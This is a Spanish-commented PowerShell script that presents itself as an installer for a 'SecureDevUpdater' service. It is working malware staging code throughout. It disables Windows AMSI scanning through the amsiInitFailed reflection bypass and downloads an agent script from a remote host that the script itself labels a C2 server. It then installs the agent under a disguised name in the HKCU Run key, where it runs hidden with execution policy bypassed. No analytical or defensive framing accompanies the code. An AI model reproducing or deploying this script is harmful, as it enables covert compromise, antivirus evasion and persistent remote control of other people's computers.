# installer_mvp5.ps1 (MVP Fase 5) - Con Bypass de AMSI y para agente MVP5
# Descarga agente (mvp5), persistencia simple, lógica de ejecución única y bypass AMSI.

# --- Bypass de AMSI (amsiInitFailed) ---
try {
    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    # Write-Host "AMSI Bypass (amsiInitFailed) intentado."
} catch {
    # Write-Warning "Fallo al intentar el bypass de AMSI: $($_.Exception.Message)"
}
# ------------------------------------

# --- Directorio de Instalación y Archivo Bandera ---
$installDirName = "SecureDevUpdaterMVP5Render" # Nombre de la carpeta en APPDATA para MVP5
$appDataDir = $env:APPDATA
$installDir = Join-Path -Path $appDataDir -ChildPath $installDirName
$flagFileName = "update_mvp5.lock" # Bandera específica para MVP5
$flagFilePath = Join-Path -Path $installDir -ChildPath $flagFileName

if (Test-Path $flagFilePath) {
    # Write-Host "Instalador MVP5 (Render): Ya completado. Saliendo."
    exit 0
}
# ----------------------------------------------------

# --- CONFIGURACIÓN ---
$staticFilesBaseUrl = "https://exa-sw-fr2c.onrender.com/files" # URL del servidor C2/archivos
$agentFileNameOnServer = "core_services_mvp5.ps1" # Agente para MVP5
# --------------------

$agentFileNameLocal = "core_services_mvp5.ps1" 
$tempDirForAgent = $env:TEMP 
$agentPathLocal = Join-Path -Path $tempDirForAgent -ChildPath $agentFileNameLocal
$downloadUrl = "$($staticFilesBaseUrl)/$($agentFileNameOnServer)"

# Write-Host "Instalador MVP5 (Render): Intentando descargar $agentFileNameOnServer desde $downloadUrl"

try {
    if (-not (Test-Path $tempDirForAgent)) {
        New-Item -Path $tempDirForAgent -ItemType Directory -Force -ErrorAction Stop | Out-Null
    }
    (New-Object Net.WebClient).DownloadFile($downloadUrl, $agentPathLocal)
    # Write-Host "Instalador MVP5 (Render): Agente descargado a $agentPathLocal"
} catch {
    # Write-Host "Instalador MVP5 (Render): Fallo descarga agente: $($_.Exception.Message)"
    exit 1
}

$runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$persistenceValueName = "SecureDevCoreServiceMVP5Render" # Nombre de persistencia para MVP5
$commandToPersist = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$agentPathLocal`""

# Write-Host "Instalador MVP5 (Render): Intentando establecer persistencia para $agentPathLocal"

try {
    Set-ItemProperty -Path $runKeyPath -Name $persistenceValueName -Value $commandToPersist -Force -ErrorAction Stop
    # Write-Host "Instalador MVP5 (Render): Persistencia establecida."
} catch {
    # Write-Host "Instalador MVP5 (Render): Fallo persistencia: $($_.Exception.Message)"
    exit 1
}

try {
    if (-not (Test-Path $installDir)) {
        New-Item -Path $installDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
        # Write-Host "Instalador MVP5 (Render): Directorio de instalación creado en $installDir"
    }
    New-Item -Path $flagFilePath -ItemType File -Force -ErrorAction Stop | Out-Null
    # Write-Host "Instalador MVP5 (Render): Archivo bandera creado. Instalación completa."
} catch {
    # Write-Host "Instalador MVP5 (Render): Fallo creando directorio de instalación o archivo bandera: $($_.Exception.Message)"
    exit 1
}

# Write-Host "Instalador MVP5 (Render) completado."
exit 0
